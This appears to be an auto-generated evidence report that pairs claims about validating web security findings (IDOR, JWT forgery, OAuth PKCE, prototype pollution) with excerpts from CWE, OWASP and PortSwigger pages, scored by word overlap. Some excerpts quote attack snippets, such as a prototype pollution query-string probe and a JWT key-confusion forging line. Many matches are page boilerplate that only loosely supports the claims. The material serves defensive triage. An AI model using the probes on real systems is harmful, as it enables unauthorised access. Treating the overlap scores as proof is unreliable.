**Claim:** Nested child refs, URL-matching discrepancies and GraphQL global node IDs all reach objects the checked field never validated.

### mitre.org — https://cwe.mitre.org/data/definitions/639.html
status `ACTIVE`, 26388 chars
- score 5: ( URL validated: 2025-11-30 ) [REF-1498] Imperva. "Insecure Direct Object Reference". https://www.imperva.com/learn/application-security/insecure-direct-object-reference-idor/ >.
  - overlap: `validated`
- score 5: The CWE team suspects that IDOR can be a part of BOLA, but BOLA expands on the weakness inherent to IDOR in that it is not only about objects that are being directly referenced.
  - overlap: `objects`
- score 5: ( URL validated: 2025-11-30 ) [REF-1521] Mateus Pantoja. "Unraveling Vulnerabilities: Understanding the difference between IDOR, BAC and BOLA".
  - overlap: `validated`
- score 5: ( URL validated: 2025-11-30 ) [REF-1497] MDN. "Insecure Direct Object Reference (IDOR)".
  - overlap: `validated`
- score 4: Alternate Terms Insecure Direct Object Reference / IDOR The "Insecure Direct Object Reference" term, as described in the OWASP Top Ten, is broader than this CWE because it also covers path traversal ( CWE-22 ).
  - overlap: ``

### owasp.org — https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
status `ACTIVE`, 10739 chars
- score 4: Object IDs can be anything from sequential integers, UUIDs, or generic strings.
  - overlap: ``
- score 3: This issue is extremely common in API-based applications because the server component usually does not fully track the client’s state, and instead, relies more on parameters like object IDs, that are sent from the client to decide which objects to access.
  - overlap: `objects`
- score 2: Comparing the user ID of the current session (e.g. by extracting it from the JWT token) with the vulnerable ID parameter isn't a sufficient solution to solve Broken Object Level Authorization (BOLA).
  - overlap: ``
- score 2: If an attacker manages to access an API endpoint/function they should not have access to - this is a case of Broken Function Level Authorization (BFLA) rather than BOLA.
  - overlap: ``
- score 2: The API fails to validate that the VIN represents a vehicle that belongs to the logged in user, which leads to a BOLA vulnerability.
  - overlap: ``

### portswigger.net — https://portswigger.net/web-security/access-control/idor
status `ACTIVE`, 9919 chars
- score 5: Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly.
  - overlap: `objects`
- score 4: IDOR vulnerabilities are most commonly associated with horizontal privilege escalation, but they can also arise in relation to vertical privilege escalation.
  - overlap: ``
- score 4: This is an example of an IDOR vulnerability leading to horizontal privilege escalation.
  - overlap: ``
- score 4: Insecure direct object references (IDOR) | Web Security Academy
  - overlap: ``
- score 3: IDOR vulnerability with direct reference to database objects Consider a website that uses the following URL to access the customer account page, by retrieving information from the back-end database: https://insecure-website.com/customer_account?customer_number=132355 Here, the customer number is used directly as a record index in queries that are performed on the back-end database.
  - overlap: `objects`

## `idor.validation.enumeration_hit_on_a_nonexistent_id_is_not_evidence_of_the_missing_owner_check`

**Claim:** A 404 for an out-of-range identifier is not evidence that the endpoint enforces ownership; the conclusive test is a differential response between two identifiers that both exist and belong to different principals.

### mitre.org — https://cwe.mitre.org/data/definitions/639.html
status `ACTIVE`, 26388 chars
- score 4: Alternate Terms Insecure Direct Object Reference / IDOR The "Insecure Direct Object Reference" term, as described in the OWASP Top Ten, is broader than this CWE because it also covers path traversal ( CWE-22 ).
  - overlap: ``
- score 4: ( URL validated: 2025-11-30 ) [REF-1498] Imperva. "Insecure Direct Object Reference". https://www.imperva.com/learn/application-security/insecure-direct-object-reference-idor/ >.
  - overlap: ``
- score 4: Notes Maintenance As of CWE 4.20, the relationship between IDOR and BOLA needs to be investigated more closely, including research into how these terms are used in the industry.
  - overlap: ``
- score 4: The CWE team suspects that IDOR can be a part of BOLA, but BOLA expands on the weakness inherent to IDOR in that it is not only about objects that are being directly referenced.
  - overlap: ``
- score 4: ( URL validated: 2025-11-30 ) [REF-1521] Mateus Pantoja. "Unraveling Vulnerabilities: Understanding the difference between IDOR, BAC and BOLA".
  - overlap: ``

### owasp.org — https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
status `ACTIVE`, 10739 chars
- score 4: Object IDs can be anything from sequential integers, UUIDs, or generic strings.
  - overlap: ``
- score 3: If an attacker manages to access an API endpoint/function they should not have access to - this is a case of Broken Function Level Authorization (BFLA) rather than BOLA.
  - overlap: `endpoint`
- score 3: In the case of BOLA, it's by design that the user will have access to the vulnerable API endpoint/function.
  - overlap: `endpoint`
- score 2: This issue is extremely common in API-based applications because the server component usually does not fully track the client’s state, and instead, relies more on parameters like object IDs, that are sent from the client to decide which objects to access.
  - overlap: ``
- score 2: Comparing the user ID of the current session (e.g. by extracting it from the JWT token) with the vulnerable ID parameter isn't a sufficient solution to solve Broken Object Level Authorization (BOLA).
  - overlap: ``

### portswigger.net — https://portswigger.net/web-security/access-control/idor
status `ACTIVE`, 9919 chars
- score 4: Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly.
  - overlap: ``
- score 4: IDOR vulnerabilities are most commonly associated with horizontal privilege escalation, but they can also arise in relation to vertical privilege escalation.
  - overlap: ``
- score 4: This is an example of an IDOR vulnerability leading to horizontal privilege escalation.
  - overlap: ``
- score 4: Insecure direct object references (IDOR) | Web Security Academy
  - overlap: ``
- score 2: IDOR vulnerability with direct reference to database objects Consider a website that uses the following URL to access the customer account page, by retrieving information from the back-end database: https://insecure-website.com/customer_account?customer_number=132355 Here, the customer number is used directly as a record index in queries that are performed on the back-end database.
  - overlap: ``

## `info_disclosure.impact.ht_but_if_they_work_and_they_are_disc`

**Claim:** An endpoint surfaced by web page source review is a triage lead whose severity depends on what that endpoint exposes, ranging from an authentication bypass to a sensitive information leak.

### owasp.org — https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html
status `ACTIVE`, 29835 chars
- score 3: Below is an example of disclosure of a SQL query error, along with the site installation path, that can be used to identify an injection point: Warning: odbc_fetch_array() expects parameter /1 to be resource, boolean given in D:\app\index_new.php on line 188 The OWASP Testing Guide provides different techniques to obtain technical information from an application.
  - overlap: `information`
- score 3: Using error messages that do not provide implementation details is important to avoid information leakage.
  - overlap: `information`
- score 2: Below is an example of the disclosure of a technology stack, here the Struts2 and Tomcat versions, via an exception rendered to the user: HTTP Status 500 - For input string: "null"
  - overlap: ``
- score 2: The OWASP Web Security Testing Guide explains how error messages can expose application details .
  - overlap: ``
- score 2: note: The full stack trace of the root cause is available in the Apache Tomcat/7.0.56 logs.
  - overlap: ``

### portswigger.net — https://portswigger.net/web-security/information-disclosure
status `ACTIVE`, 15173 chars
- score 10: Impact Assessing the severity Testing for information disclosure Fuzzing Using Burp Scanner Using Burp's engagement tools Engineering informative responses Common sources of information disclosure Files for web crawlers Directory listings Developer comments Error messages Debugging data User account pages Backup files Insecure configuration Version control history Preventing View all information disclosure labs Web Security Academy Information disclosure Information disclosure vulnerabilities In this section, we'll explain the basics of information disclosure vulnerabilities and describe how you can find and exploit them.
  - overlap: `information, severity`
- score 6: How to assess the severity of information disclosure vulnerabilities Although the ultimate impact can potentially be very severe, it is only in specific circumstances that information disclosure is a high-severity issue on its own.
  - overlap: `information, severity`
- score 6: Information disclosure, also known as information leakage, is when a website unintentionally reveals sensitive information to its users.
  - overlap: `information, sensitive`
- score 5: Find information disclosure vulnerabilities using Burp Suite Try for free Burp Suite Web vulnerability scanner Burp Suite Editions Release Notes Vulnerabilities Cross-site scripting (XSS) SQL injection Cross-site request forgery XML external entity injection Directory traversal Server-side request forgery Customers Organizations Testers Developers Company About Careers Contact Legal Privacy Notice Modern Slavery Statement Insights Web Security Academy Blog Research Follow us © 2026 PortSwigger Ltd.
  - overlap: `information`
- score 5: Labs If you're already familiar with the basic concepts behind information disclosure vulnerabilities and just want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access all of the labs in this topic from the link below.
  - overlap: `information`

## `internal_recon.technique.private_address_space_predicts_host_role`

**Claim:** Private address space is only unique within an enterprise, so addresses observed on an internal network carry local rather than global meaning and inference about host role is drawn from naming and addressing conventions rather than from any global registry.

### mitre.org — https://attack.mitre.org/tactics/TA0043/
status `ACTIVE`, 22975 chars
- score 4: Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments.
  - overlap: `internal, network`
- score 2: Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.
  - overlap: `addresses, internal`
- score 1: × Core Objects: All Core ATT&CK Objects All None Matrices Tactics Techniques Sub-Techniques Defenses: All Defenses All None Mitigations Assets Detection Strategies Analytics Data Components CTI: All CTI All None Groups Software Campaigns Reference: All Reference All None Resources Domains: All Domains All None Enterprise Mobile ICS Reset filters
  - overlap: `enterprise`
- score 1: Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.
  - overlap: `addresses`
- score 1: Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.
  - overlap: `addresses`

## `jwt.validation.rejection_is_not_a_finding`

**Claim:** A 400/401 on a forged JWT is the expected rejection, not evidence of a flaw; a finding requires proof the verifier accepted an attacker-signed token.

### mitre.org — https://cwe.mitre.org/data/definitions/347.html
status `ACTIVE`, 18853 chars
- score 2: CWE-347: Improper Verification of Cryptographic Signature (4.20) ID Lookup: Home About ▼ Who We Are User Stories History Documents Videos Learn ▼ Basics Root Cause Mapping ► Guidance Quick Tips Examples How to Contribute Weakness Content FAQs Glossary Access Content ▼ Top-N Lists ► Top 25 Software Top Hardware Top 10 KEV Weaknesses CWE List ► Current Version Reports Visualizations Releases Archive Downloads REST API Community ▼ News ► Current News Blog Podcast News Archive CWE Board Working Groups & Special Interest Groups Email Lists Search ▼ Search CWE List Search Website browserheight();
  - overlap: ``
- score 2: Taxonomy Mappings Mapped Taxonomy Name Node ID Fit Mapped Node Name PLOVER Improperly Verified Signature The CERT Oracle Secure Coding Standard for Java (2011) SEC06-J Do not rely on the default automatic signature verification provided by URLClassLoader and java.util.jar ISA/IEC 62443 Part 3-3 Req SR 1.9 ISA/IEC 62443 Part 4-1 Req SM-6 ISA/IEC 62443 Part 4-2 Req EDR 3.12 ISA/IEC 62443 Part 4-2 Req NDR 3.12 ISA/IEC 62443 Part 4-2 Req HDR 3.12
  - overlap: ``
- score 2: (bad code) Example Language: Java File f = new File(downloadedFilePath); JarFile jf = new JarFile(f); The JAR file that was potentially downloaded from an untrusted source is created without verifying the signature (if present).
  - overlap: ``
- score 2: CWE-347: Improper Verification of Cryptographic Signature (4.20) Common Weakness Enumeration Celebrating 20 years of community-developed cybersecurity weakness knowledge!
  - overlap: ``
- score 2: Related Attack Patterns CAPEC-ID Attack Pattern Name CAPEC-463 Padding Oracle Crypto Attack CAPEC-475 Signature Spoofing by Improper Validation
  - overlap: ``

### owasp.org — https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet.html
status `ACTIVE`, 46151 chars
- score 10: Example ¶ For example, the following example ( taken from JWT.IO ): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.KMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30 The first part ( protected header ) can be decoded into: { "alg" : "HS256" , "typ" : "JWT" } The second part ( claims ) can be decoded into: { "sub" : "1234567890" , "name" : "John Doe" , "admin" : true , "iat" : 1516239022 } The last part ( signature ) guarantees the authenticity of both the header and the claims, either using a public/private key pair (digital signature) or a shared secret (MAC), depending on the alg header value.
  - overlap: ``
- score 8: Example of legitimate token issuance: token = jwt . encode ( claims , private_key_bytes , algorithm = "ES256" ) Example of attacker forging a token based on key type confusion: token = jwt . encode ( claims , public_key_bytes , algorithm = "HS256" ) Example of validation potentially vulnerable to key type confusion: # If the token is using a MAC, the library might interpret the public key bytes as a MAC secret: decoded = jwt . decode ( token , public_key_bytes , algorithms = jwt . algorithms . get_default_algorithms ()) Note: this issue is mitigated in recent versions of the PyJWT library by detecting whether a MAC key appears to be a public key (in PEM of SSH format).
  - overlap: `attacker, token`
- score 8: Token Structure ¶ Signed JWTs have the following structure: {base64url(json(header))}.{base64url(json(claims))}.{base64url(signature)} The following elements are present in signed JWTs: Protected Header: the JWT header contains some information about the token such as the type of token (IANA media type) and the cryptographic algorithms used to protect the token.
  - overlap: `signed, token`
- score 8: MAC Public-key Signatures MAC Header fields Claims Threats on JWTs Unsecured JWTs Key type confusion Trusting key material named in the token header Issuer and audience confusion Cross-JWT and token type confusion JWT revocation Token Status List Replay protection JWT denylist Token Confidentiality and JWE Signed JWTs are not confidential Using JWE References
  - overlap: `signed, token`
- score 8: MAC Public-key Signatures MAC Header fields Claims Threats on JWTs Unsecured JWTs Key type confusion Trusting key material named in the token header Issuer and audience confusion Cross-JWT and token type confusion JWT revocation Token Status List Replay protection JWT denylist Token Confidentiality and JWE Signed JWTs are not confidential Using JWE References
  - overlap: `signed, token`

## `oauth.test.pkce_bypass_requires_a_code_redeemed_with_a_verifier_the_interceptor_could_not_have_known`

**Claim:** Code interception is only proved when an authorization code obtained without ever seeing the victim's code_verifier is successfully exchanged at the token endpoint, which happens if and only if the server either recorded no code_challenge or silently accepted a plain or substituted one.

### mitre.org — https://cwe.mitre.org/data/definitions/346.html
status `ACTIVE`, 26333 chars
- score 2: The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness.
  - overlap: ``
- score 2: Impact Details Gain Privileges or Assume Identity; Varies by Context Scope: Access Control, Other An attacker can access any functionality that is inadvertently accessible to the source.
  - overlap: ``
- score 1: Demonstrative Examples Example 1 This Android application will remove a user account when it receives an intent to do so: (bad code) Example Language: Java IntentFilter filter = new IntentFilter("com.example.RemoveUser"); MyReceiver receiver = new MyReceiver(); registerReceiver(receiver, filter); public class DeleteReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { int userID = intent.getIntExtra("userID"); destroyUserData(userID); } } This application does not check the origin of the intent, thus allowing any malicious application to remove a user.
  - overlap: `code`
- score 1: Although not formally defined, an issue is considered to be an origin validation error if either (1) "an object [accepts] input from an unauthorized subject," or (2) "the system [fails] to properly or completely authenticate a subject." A later section says that an origin validation error can occur when the system (1) "does not properly authenticate a user or process" or (2) "does not properly authenticate the shared data or libraries." The only example provided in the thesis (covered by OSVDB:57615) involves a setuid program running command-line arguments without dropping privileges.
  - overlap: `either`
- score 1: UIWebView *webView = [self writeDataToView:[URL query]]; } return NO; } return YES; } A call into native code can then be initiated by passing parameters within the URL: (attack code) Example Language: JavaScript window.location = examplescheme://method?parameter=value Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site.
  - overlap: `code`

### owasp.org — https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html
status `ACTIVE`, 43268 chars
- score 3: :root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"} __md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}
  - overlap: `code`
- score 2: Access control checks must be performed server-side, at the gateway, or using serverless functions (see OWASP ASVS 4.0.3, V1.4.1 and V4.1.1 ) Exit Safely when Authorization Checks Fail ¶ Failed access control checks are a normal occurrence in a secured application; consequently, developers must plan for such failures and handle them securely.
  - overlap: `authorization, server`
- score 2: For example it should be possible to retrieve some objects, such as account details, based solely on currently authenticated user's identity and attributes (e.g. through information contained in a securely implemented JSON Web Token (JWT) or server-side session).
  - overlap: `server, token`
- score 2: Thus, the business cost of a successfully exploited authorization flaw can range from very low to extremely high.
  - overlap: `authorization, successfully`
- score 1: Table of contents Introduction Recommendations Enforce Least Privileges Deny by Default Validate the Permissions on Every Request Thoroughly Review the Authorization Logic of Chosen Tools and Technologies, Implementing Custom Logic if Necessary Prefer Attribute and Relationship Based Access Control over RBAC Ensure Lookup IDs are Not Accessible Even When Guessed or Cannot Be Tampered With Enforce Authorization Checks on Static Resources Verify that Authorization Checks are Performed in the Right Location Exit Safely when Authorization Checks Fail Implement Appropriate Logging Create Unit and Integration Test Cases for Authorization Logic References
  - overlap: `authorization`

### portswigger.net — https://portswigger.net/web-security/oauth
status `ACTIVE`, 34567 chars
- score 12: OAuth grant types OAuth scopes Authorization code grant type Implicit grant type OAuth authentication Identifying Recon of the OAuth service How vulnerabilities arise Exploiting vulnerabilities Improper implementation of the implicit grant type Flawed CSRF protection Leaking authorization codes and access tokens Flawed scope validation Unverified user registration OpenID Connect How does OpenID Connect work?
  - overlap: `authorization, code`
- score 11: For example, an authorization request will usually look something like this: GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 Host: oauth-authorization-server.com Recon Doing some basic recon of the OAuth service being used can point you in the right direction when it comes to identifying vulnerabilities.
  - overlap: `authorization, server, token`
- score 10: Roles Claims and scopes ID token Identifying OpenID Connect Vulnerabilities Unprotected dynamic client registration Allowing authorization requests by reference Preventing vulnerabilities Service providers Client applications View all OAuth authentication labs Web Security Academy OAuth authentication OAuth 2.0 authentication vulnerabilities While browsing the web, you've almost certainly come across sites that let you log in using your social media account.
  - overlap: `authorization, token`
- score 8: Depending on the grant type, either a code or token is sent via the victim's browser to the /callback endpoint specified in the redirect_uri parameter of the authorization request.
  - overlap: `authorization, code, either, endpoint, token, victim`
- score 7: Vulnerabilities in the client application Improper implementation of the implicit grant type LABS Flawed CSRF protection LABS Vulnerabilities in the OAuth service Leaking authorization codes and access tokens LABS Flawed scope validation Unverified user registration Vulnerabilities in the OAuth client application Client applications will often use a reputable, battle-hardened OAuth service that is well protected against widely known exploits.
  - overlap: `authorization`

## `oauth.validation.pkce_presence_is_not_evidence_that_code_injection_is_defeated`

**Claim:** A client that sends code_challenge proves nothing on its own: PKCE defeats code injection only if the authorization server enforced the challenge and the client supplied the matching code_verifier at the token endpoint.

### mitre.org — https://cwe.mitre.org/data/definitions/346.html
status `ACTIVE`, 26333 chars
- score 2: The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness.
  - overlap: ``
- score 2: Impact Details Gain Privileges or Assume Identity; Varies by Context Scope: Access Control, Other An attacker can access any functionality that is inadvertently accessible to the source.
  - overlap: ``
- score 1: Demonstrative Examples Example 1 This Android application will remove a user account when it receives an intent to do so: (bad code) Example Language: Java IntentFilter filter = new IntentFilter("com.example.RemoveUser"); MyReceiver receiver = new MyReceiver(); registerReceiver(receiver, filter); public class DeleteReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { int userID = intent.getIntExtra("userID"); destroyUserData(userID); } } This application does not check the origin of the intent, thus allowing any malicious application to remove a user.
  - overlap: `code`
- score 1: UIWebView *webView = [self writeDataToView:[URL query]]; } return NO; } return YES; } A call into native code can then be initiated by passing parameters within the URL: (attack code) Example Language: JavaScript window.location = examplescheme://method?parameter=value Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site.
  - overlap: `code`
- score 1: Detection Methods Method Details Automated Static Analysis Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it.
  - overlap: `code`

### owasp.org — https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html
status `ACTIVE`, 43268 chars
- score 3: :root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"} __md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}
  - overlap: `code`
- score 2: Access control checks must be performed server-side, at the gateway, or using serverless functions (see OWASP ASVS 4.0.3, V1.4.1 and V4.1.1 ) Exit Safely when Authorization Checks Fail ¶ Failed access control checks are a normal occurrence in a secured application; consequently, developers must plan for such failures and handle them securely.
  - overlap: `authorization, server`
- score 2: For example it should be possible to retrieve some objects, such as account details, based solely on currently authenticated user's identity and attributes (e.g. through information contained in a securely implemented JSON Web Token (JWT) or server-side session).
  - overlap: `server, token`
- score 2: Verify that Authorization Checks are Performed in the Right Location ¶ Developers must never rely on client-side access control checks.
  - overlap: `authorization, client`
- score 1: Made with Material for MkDocs {"annotate": null, "base": "..", "features": ["navigation.sections", "navigation.expand"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}
  - overlap: `matching`

### portswigger.net — https://portswigger.net/web-security/oauth
status `ACTIVE`, 34567 chars
- score 12: For example, an authorization request will usually look something like this: GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 Host: oauth-authorization-server.com Recon Doing some basic recon of the OAuth service being used can point you in the right direction when it comes to identifying vulnerabilities.
  - overlap: `authorization, client, server, token`
- score 12: OAuth grant types OAuth scopes Authorization code grant type Implicit grant type OAuth authentication Identifying Recon of the OAuth service How vulnerabilities arise Exploiting vulnerabilities Improper implementation of the implicit grant type Flawed CSRF protection Leaking authorization codes and access tokens Flawed scope validation Unverified user registration OpenID Connect How does OpenID Connect work?
  - overlap: `authorization, code`
- score 11: Roles Claims and scopes ID token Identifying OpenID Connect Vulnerabilities Unprotected dynamic client registration Allowing authorization requests by reference Preventing vulnerabilities Service providers Client applications View all OAuth authentication labs Web Security Academy OAuth authentication OAuth 2.0 authentication vulnerabilities While browsing the web, you've almost certainly come across sites that let you log in using your social media account.
  - overlap: `authorization, client, token`
- score 8: Vulnerabilities in the client application Improper implementation of the implicit grant type LABS Flawed CSRF protection LABS Vulnerabilities in the OAuth service Leaking authorization codes and access tokens LABS Flawed scope validation Unverified user registration Vulnerabilities in the OAuth client application Client applications will often use a reputable, battle-hardened OAuth service that is well protected against widely known exploits.
  - overlap: `authorization, client`
- score 7: Something like this: https://client-app.com/oauth/callback/../../example/path May be interpreted on the back-end as: https://client-app.com/example/path Once you identify which other pages you are able to set as the redirect URI, you should audit them for additional vulnerabilities that you can potentially use to leak the code or token.
  - overlap: `client, code, token`

## `prototype_pollution.evidence.reject_a_prototype_pollution_finding_until_i`

**Claim:** A convincing observation for this class is: Adjacent behaviour that produces the same observable result: A prototype pollution report is validated only when a probe sent in one request changes an object built by a different, later request; a change reproduced only within the payload's own request does not demonstrate prototype pollution.

### mitre.org — https://cwe.mitre.org/data/definitions/1321.html
status `ACTIVE`, 19144 chars
- score 7: CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') (4.20) ID Lookup: Home About ▼ Who We Are User Stories History Documents Videos Learn ▼ Basics Root Cause Mapping ► Guidance Quick Tips Examples How to Contribute Weakness Content FAQs Glossary Access Content ▼ Top-N Lists ► Top 25 Software Top Hardware Top 10 KEV Weaknesses CWE List ► Current Version Reports Visualizations Releases Archive Downloads REST API Community ▼ News ► Current News Blog Podcast News Archive CWE Board Working Groups & Special Interest Groups Email Lists Search ▼ Search CWE List Search Website browserheight();
  - overlap: `object, pollution, prototype`
- score 7: CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') (4.20) Common Weakness Enumeration Celebrating 20 years of community-developed cybersecurity weakness knowledge!
  - overlap: `object, pollution, prototype`
- score 7: div.collapseblock { display:inline} CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') Weakness ID: 1321
  - overlap: `object, pollution, prototype`
- score 7: CVE-2019-10744 Prototype pollution by setting default values to object attributes recursively.
  - overlap: `object, pollution, prototype`
- score 7: CVE-2020-8203 Prototype pollution by setting object attributes based on dot-separated path.
  - overlap: `object, pollution, prototype`

### portswigger.net — https://portswigger.net/web-security/prototype-pollution
status `ACTIVE`, 17189 chars
- score 11: objectLiteral.hasOwnProperty('__proto__'); // false objectFromJson.hasOwnProperty('__proto__'); // true If the object created via JSON.parse() is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment, as we saw in the previous URL-based example .
  - overlap: `object, pollution, prototype`
- score 9: Detecting via polluted property reflection Detecting without polluted property reflection Status code override JSON spaces override Charset override Scanning for sources Bypassing input filters Remote code execution Identifying a vulnerable request child_process.fork() method child_process.execSync() method Preventing vulnerabilities Sanitizing property keys Preventing changes to prototype objects Preventing an object from inheriting properties Using safer alternatives where possible View all prototype pollution labs Web Security Academy Prototype pollution What is prototype pollution?
  - overlap: `changes, object, pollution, prototype, request`
- score 9: The most common sources are as follows: The URL via either the query or fragment string (hash) JSON-based input Web messages Prototype pollution via the URL Consider the following URL, which contains an attacker-constructed query string: https://vulnerable-website.com/?__proto__[evilProperty]=payload When breaking the query string down into key:value pairs, a URL parser may interpret __proto__ as an arbitrary string.
  - overlap: `payload, pollution, prototype`
- score 9: Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys.
  - overlap: `object, pollution, prototype`
- score 8: At some point, the recursive merge operation may assign the value of evilProperty using a statement equivalent to the following: targetObject.__proto__.evilProperty = 'payload'; During this assignment, the JavaScript engine treats __proto__ as a getter for the prototype.
  - overlap: `payload, prototype`

## `prototype_pollution.fp_rule.auto.derived`

**Claim:** Reject a prototype_pollution finding until it is distinguished from the adjacent behaviour this class also covers. "Prototype pollution requires an untrusted JSON body or query object to reach a sink that merges, extends, clones or deep-assigns it into a server-side object; where user input is only read as a scalar and never merged, no payload can..." and "A prototype pollution report is validated only when a probe sent in one request changes an object built by a different, later request; a change reproduced only within the payload's own request does not demonstrate prototype pollution." share a surface and a symptom, so a response that matches the first is not evidence for it while the second remains possible.

### mitre.org — https://cwe.mitre.org/data/definitions/1321.html
status `ACTIVE`, 19144 chars
- score 8: CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') (4.20) ID Lookup: Home About ▼ Who We Are User Stories History Documents Videos Learn ▼ Basics Root Cause Mapping ► Guidance Quick Tips Examples How to Contribute Weakness Content FAQs Glossary Access Content ▼ Top-N Lists ► Top 25 Software Top Hardware Top 10 KEV Weaknesses CWE List ► Current Version Reports Visualizations Releases Archive Downloads REST API Community ▼ News ► Current News Blog Podcast News Archive CWE Board Working Groups & Special Interest Groups Email Lists Search ▼ Search CWE List Search Website browserheight();
  - overlap: `object, pollution, prototype, user`
- score 8: Phase Note Architecture and Design Implementation This weakness is often found in code that assigns object attributes based on user input, or merges or clones objects recursively.
  - overlap: `assigns, clones, input, merges, object, user`
- score 7: CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') (4.20) Common Weakness Enumeration Celebrating 20 years of community-developed cybersecurity weakness knowledge!
  - overlap: `object, pollution, prototype`
- score 7: div.collapseblock { display:inline} CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') Weakness ID: 1321
  - overlap: `object, pollution, prototype`
- score 7: CVE-2019-10744 Prototype pollution by setting default values to object attributes recursively.
  - overlap: `object, pollution, prototype`

### portswigger.net — https://portswigger.net/web-security/prototype-pollution
status `ACTIVE`, 17189 chars
- score 13: objectLiteral.hasOwnProperty('__proto__'); // false objectFromJson.hasOwnProperty('__proto__'); // true If the object created via JSON.parse() is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment, as we saw in the previous URL-based example .
  - overlap: `json, merged, object, pollution, prototype`
- score 12: Object inheritance Prototype chain Accessing an object's prototype Modifying prototypes How vulnerabilities arise Sources URL JSON input Sinks Gadgets Client-side prototype pollution Finding sources manually Finding sources using DOM Invader Finding gadgets manually Finding gadgets using DOM Invader Prototype pollution via the constructor Bypassing flawed key sanitization Prototype pollution in external libraries Prototype pollution via browser APIs fetch() method Object.defineProperty() method Server-side prototype pollution Why is server-side prototype pollution more difficult to detect?
  - overlap: `finding, input, json, object, pollution, prototype, server, side`
- score 12: Detecting via polluted property reflection Detecting without polluted property reflection Status code override JSON spaces override Charset override Scanning for sources Bypassing input filters Remote code execution Identifying a vulnerable request child_process.fork() method child_process.execSync() method Preventing vulnerabilities Sanitizing property keys Preventing changes to prototype objects Preventing an object from inheriting properties Using safer alternatives where possible View all prototype pollution labs Web Security Academy Prototype pollution What is prototype pollution?
  - overlap: `changes, input, json, object, pollution, possible, prototype, request`
- score 12: The most common sources are as follows: The URL via either the query or fragment string (hash) JSON-based input Web messages Prototype pollution via the URL Consider the following URL, which contains an attacker-constructed query string: https://vulnerable-website.com/?__proto__[evilProperty]=payload When breaking the query string down into key:value pairs, a URL parser may interpret __proto__ as an arbitrary string.
  - overlap: `input, json, payload, pollution, prototype, query`
- score 12: Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys.
  - overlap: `first, merges, object, pollution, prototype, user`

## `prototype_pollution.prerequisite.caller_controlled_assignment_path`

**Claim:** A deserializer that applies assignments addressed by a caller-supplied path string is prototype-pollutable even when the path is validated as a string, because the destination path may itself contain __proto__ or constructor.prototype segments.

### mitre.org — https://cwe.mitre.org/data/definitions/1321.html
status `ACTIVE`, 19144 chars
